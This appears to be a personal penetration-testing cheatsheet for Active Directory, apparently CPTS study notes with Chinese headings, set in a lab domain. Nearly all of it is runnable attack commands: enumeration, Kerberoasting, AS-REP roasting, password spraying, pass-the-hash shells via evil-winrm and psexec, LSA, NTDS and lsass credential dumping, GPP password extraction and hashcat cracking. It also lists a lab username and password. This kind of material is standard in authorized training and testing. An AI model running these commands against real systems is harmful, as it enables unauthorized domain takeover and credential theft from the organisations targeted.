# AD Enumeration Cheatsheet

## 標籤

- #cpts
- #cheatsheets
- #ad

---

## 環境變數（每次開 shell 先設）

```bash
export PC=/tmp/pc-chisel.conf          # proxychains config
export DC=172.16.139.3                 # DC IP
export DOMAIN=ad.trilocor.local
export USER=sqldev
export PASS='1212developer'
export PYTHON=/home/wayne/.local/share/pipx/venvs/impacket/bin/python3
```

---

## 無憑證枚舉

```bash
# SMB null session
nxc smb $DC
nxc smb $DC -u '' -p ''
nxc smb $DC --shares

# RPC null session
proxychains4 -f $PC rpcclient -U "" -N $DC
  > enumdomusers
  > enumdomgroups
  > querydominfo

# LDAP anonymous
proxychains4 -f $PC ldapsearch -x -H ldap://$DC \
  -b 'DC=ad,DC=trilocor,DC=local' | head -50

# Kerberos 用戶列舉（無憑證）
proxychains4 -f $PC kerbrute userenum --dc $DC -d $DOMAIN /usr/share/wordlists/usernames.txt
```

---

## 有憑證枚舉

### 使用者 & 群組

```bash
# 所有使用者
proxychains4 -f $PC nxc ldap $DC -u $USER -p $PASS -d $DOMAIN --users 2>/dev/null

# 所有群組
proxychains4 -f $PC nxc ldap $DC -u $USER -p $PASS --groups

# 某群組成員
proxychains4 -f $PC nxc ldap $DC -u $USER -p $PASS \
  --groups 2>/dev/null | grep -i "domain admin"

# LDAP 查特定帳號
proxychains4 -f $PC ldapsearch -x -H ldap://$DC \
  -D "$USER@$DOMAIN" -w "$PASS" \
  -b "DC=ad,DC=trilocor,DC=local" \
  "(sAMAccountName=TARGET)" memberOf description lastLogon 2>/dev/null
```

### SPN / Kerberoastable

```bash
# 列出有 SPN 的帳號
proxychains4 -f $PC nxc ldap $DC -u $USER -p $PASS --kerberoasting /tmp/kerb.txt

# GetUserSPNs（含時鐘修正）
CT=$(proxychains4 -f $PC ldapsearch -x -H ldap://$DC \
  -D "$USER@$DOMAIN" -w "$PASS" \
  -b '' -s base currentTime 2>/dev/null | grep '^currentTime:' | awk '{print $2}')
DC_TIME="${CT:0:4}-${CT:4:2}-${CT:6:2} ${CT:8:2}:${CT:10:2}:${CT:12:2}"

TZ=UTC faketime "$DC_TIME" proxychains4 -f $PC $PYTHON \
  /home/wayne/.local/share/pipx/venvs/impacket/bin/GetUserSPNs.py \
  "$DOMAIN/$USER:$PASS" -dc-ip $DC -request -outputfile /tmp/kerb_hashes.txt
```

### ASREPRoast

```bash
proxychains4 -f $PC $PYTHON \
  /home/wayne/.local/share/pipx/venvs/impacket/bin/GetNPUsers.py \
  "$DOMAIN/$USER:$PASS" -dc-ip $DC -request -outputfile /tmp/asrep_hashes.txt
```

### BloodHound 收集

```bash
proxychains4 -f $PC python3 bloodhound-python \
  -u $USER -p "$PASS" -d $DOMAIN \
  -dc $DC -ns $DC -c all --zip -o /tmp/bh/
```

---

## 密碼噴灑

```bash
# nxc SMB spray
proxychains4 -f $PC nxc smb $DC \
  -u /tmp/users.txt -p 'Password123!' -d $DOMAIN \
  --continue-on-success 2>/dev/null | grep -v FAIL

# nxc WinRM spray
proxychains4 -f $PC nxc winrm $DC \
  -u /tmp/users.txt -p 'Password123!' 2>/dev/null | grep -v FAIL

# 時間間隔（避免鎖帳號）
for pass in 'Pass1' 'Pass2'; do
  proxychains4 -f $PC nxc smb $DC \
    -u /tmp/users.txt -p "$pass" --continue-on-success 2>/dev/null | grep -v FAIL
  sleep 30
done
```

---

## 橫向移動驗證

```bash
# PTH - SMB
proxychains4 -f $PC nxc smb TARGET_IP \
  -u Administrator -H NTLM_HASH --local-auth

# PTH - WinRM
proxychains4 -f $PC nxc winrm TARGET_IP \
  -u Administrator -H NTLM_HASH --local-auth

# evil-winrm（互動式 shell）
proxychains4 -f $PC evil-winrm -i TARGET_IP \
  -u Administrator -H NTLM_HASH

# impacket psexec
proxychains4 -f $PC $PYTHON /path/to/psexec.py \
  -hashes :NTLM_HASH "domain/Administrator@TARGET_IP"
```

---

## 憑證蒐集

```bash
# LSA dump（透過 WinRM / SMB）
proxychains4 -f $PC nxc smb TARGET_IP \
  -u Administrator -H NTLM --local-auth --lsa

# NTDS dump（DC 上）
proxychains4 -f $PC nxc smb $DC \
  -u Administrator -H NTLM --ntds

# lsass dump（comsvcs.dll，在 evil-winrm shell 中）
Get-Process lsass | Select Id
rundll32 C:\Windows\System32\comsvcs.dll MiniDump LSASS_PID C:\Windows\Temp\lsass.dmp full

# 傳回 Kali 解析
proxychains4 -f $PC nxc smb TARGET_IP \
  -u Administrator -H NTLM --local-auth \
  --get-file C:\Windows\Temp\lsass.dmp /tmp/lsass.dmp

pypykatz lsa minidump /tmp/lsass.dmp
```

---

## SMB Share 枚舉

```bash
# 列出 shares
proxychains4 -f $PC nxc smb $DC -u $USER -p $PASS -d $DOMAIN --shares

# 爬 SYSVOL
proxychains4 -f $PC nxc smb $DC -u $USER -p $PASS \
  --spider SYSVOL --pattern '\.bat|\.ps1|\.vbs|\.ini' 2>/dev/null

# GPP 密碼
proxychains4 -f $PC nxc smb $DC -u $USER -p $PASS -M gpp_password
proxychains4 -f $PC nxc smb $DC -u $USER -p $PASS -M gpp_autologin

# spider_plus（列出所有檔案）
proxychains4 -f $PC nxc smb $DC -u $USER -p $PASS -M spider_plus
```

---

## Hash 破解速查

```bash
# Kerberoast TGS (Type 23)
hashcat -m 13100 /tmp/kerb_hashes.txt /usr/share/wordlists/rockyou.txt --force

# ASREPRoast (Type 18)
hashcat -m 18200 /tmp/asrep_hashes.txt /usr/share/wordlists/rockyou.txt --force

# NTLMv2 (Net-NTLMv2)
hashcat -m 5600 /tmp/ntlmv2.hash /usr/share/wordlists/rockyou.txt --force

# DCC2 (Domain Cached Credentials)
hashcat -m 2100 /tmp/dcc2.hash /usr/share/wordlists/rockyou.txt --force

# NTLM
hashcat -m 1000 /tmp/ntlm.hash /usr/share/wordlists/rockyou.txt --force
```

---

## 關聯筆記

- [[../09-Active-Directory/72-無憑證AD列舉|第 72 章 - 無憑證 AD 列舉]]
- [[../09-Active-Directory/73-有憑證AD列舉|第 73 章 - 有憑證 AD 列舉]]
- [[../09-Active-Directory/75-Kerberos攻擊|第 75 章 - Kerberos 攻擊]]
- [[../09-Active-Directory/77-ADACL濫用|第 77 章 - AD ACL 濫用]]
